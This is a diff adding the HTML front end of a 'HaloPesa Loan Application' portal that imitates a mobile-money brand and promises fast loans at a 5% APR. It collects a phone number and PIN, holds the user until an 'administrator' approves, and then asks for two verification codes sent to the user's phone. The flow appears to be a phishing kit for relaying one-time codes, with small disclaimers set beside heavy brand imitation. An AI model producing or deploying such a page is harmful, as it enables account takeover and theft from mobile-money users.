@@ -1,0 +1,122 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+  <meta name="theme-color" content="#f4511e">
+  <title>HaloPesa Loan Application</title>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+<main class="app">
+  <header class="topbar">
+    <div class="brand-mark">H</div>
+    <div><div class="brand">HaloPesa Loan Application</div><div class="subbrand">Loan application • Secure • Fast</div></div>
+    <div class="secure">🔒</div>
+  </header>
+
+  <div class="notice">
+    <strong>HaloPesa Disbursement</strong>
+    <span>This is an independent loan application portal. Never enter your HaloPesa PIN.</span>
+  </div>
+
+  <div class="steps" aria-label="Application progress">
+    <span class="step active">1</span><i></i><span class="step">2</span><i></i>
+    <span class="step">3</span><i></i><span class="step">4</span><i></i><span class="step">5</span>
+  </div>
+
+  <section class="page active" data-page="1">
+    <div class="hero"><div class="icon">📱</div><h1>Customer Login</h1>
+      <p>Enter your phone number and application PIN.</p></div>
+    <form id="loginForm" class="card form-card">
+      <label>Phone number</label>
+      <input id="phone" required placeholder="07XXXXXXXX" inputmode="tel" autocomplete="tel">
+      <label>Application PIN</label>
+      <input id="portalPin" required minlength="4" maxlength="6" inputmode="numeric"
+             pattern="[0-9]{4,6}" placeholder="4–6 digit PIN" autocomplete="off">
+      <div class="hint">Use only the PIN created for this loan application. Do not enter your HaloPesa PIN.</div>
+      <button class="primary" type="submit">CONTINUE <span>→</span></button>
+      <div class="error hidden" id="loginError"></div>
+    </form>
+  </section>
+
+  <section class="page" data-page="2">
+    <div class="hero"><div class="icon">💰</div><h1>Loan Details</h1>
+      <p>Select the amount and repayment period.</p></div>
+    <div class="card">
+      <div class="field-head"><label>Amount</label><output id="amountOutput">TZS 1,000,000</output></div>
+      <input id="amount" class="range" type="range" min="50000" max="5000000" step="10000" value="1000000">
+      <div class="field-head"><label>Repayment period</label><output id="termOutput">3 Months</output></div>
+      <input id="term" class="range" type="range" min="1" max="24" step="1" value="3">
+      <div class="rate-row"><span>Interest rate</span><strong id="rateOutput">5% APR</strong></div>
+      <div class="calculation">
+        <div><small>Monthly payment</small><strong id="monthlyOutput">TZS —</strong></div>
+        <div><small>Total repayment</small><strong id="totalOutput">TZS —</strong></div>
+      </div>
+      <button class="primary" id="submitApplication">SUBMIT APPLICATION <span>→</span></button>
+      <button class="ghost" data-back="1">← Back</button>
+      <div class="error hidden" id="page2Error"></div>
+    </div>
+  </section>
+
+  <section class="page" data-page="3">
+    <div class="hero"><div class="icon">⏳</div><h1>Awaiting Approval</h1>
+      <p>Your application is waiting for review by an authorized administrator.</p></div>
+    <div class="card waiting-card">
+      <div class="spinner"></div><strong>Waiting for approval</strong>
+      <span>We will automatically continue when the application is approved.</span>
+      <small>Application: <b id="applicationNumber">—</b></small>
+      <div class="error hidden" id="page3Error"></div>
+    </div>
+  </section>
+
+  <section class="page" data-page="4">
+    <div class="hero"><div class="icon">🔢</div><h1>Enter Verification Code</h1>
+      <p>Enter the first portal verification code sent to your registered phone.</p></div>
+    <div class="card form-card">
+      <label>Verification code</label>
+      <input id="verificationCode" maxlength="6" inputmode="numeric" placeholder="6-digit code">
+      <div class="timer"><span id="verifyTimer">30</span> seconds</div>
+      <button class="primary" id="verifyCodeBtn">VERIFY CODE <span>→</span></button>
+      <button class="ghost" id="resendVerification">RESEND CODE</button>
+      <div class="dev-code hidden" id="devVerification"></div>
+      <div class="error hidden" id="page4Error"></div>
+    </div>
+  </section>
+
+  <section class="page" data-page="5">
+    <div class="hero"><div class="icon">🔐</div><h1>Final Confirmation</h1>
+      <p>Enter the second confirmation code to complete the application.</p></div>
+    <div class="card form-card">
+      <div class="offer">
+        <span>Loan amount</span><strong id="finalAmount">TZS —</strong>
+        <span>Repayment period</span><strong id="finalTerm">—</strong>
+        <span>Monthly payment</span><strong id="finalMonthly">TZS —</strong>
+        <span>Total repayment</span><strong id="finalTotal">TZS —</strong>
+      </div>
+      <label>Second confirmation code</label>
+      <input id="confirmationCode" maxlength="6" inputmode="numeric" placeholder="6-digit code">
+      <div class="timer"><span id="confirmTimer">30</span> seconds</div>
+      <button class="primary" id="confirmBtn">CONFIRM <span>→</span></button>
+      <button class="ghost" id="resendConfirmation">RESEND CODE</button>
+      <div class="dev-code hidden" id="devConfirmation"></div>
+      <div class="error hidden" id="page5Error"></div>
+    </div>
+  </section>
+
+  <section class="page" data-page="success">
+    <div class="success-card">
+      <div class="big-check">✓</div>
+      <h1>Congratulations!</h1>
+      <p>Your loan has been approved and is being processed for disbursement to your registered HaloPesa line within 24 hours.</p>
+      <div class="brand-disclaimer">Independent loan application portal — not an official HaloPesa service.</div>
+      <div class="application-number" id="successNumber">LP-—</div>
+      <small>Keep this application number for reference.</small>
+    </div>
+  </section>
+
+  <footer><span>🔒 Secure application</span><span>•</span><span>HaloPesa disbursement workflow</span></footer>
+</main>
+<script src="/app.js"></script>
+</body>
+</html>
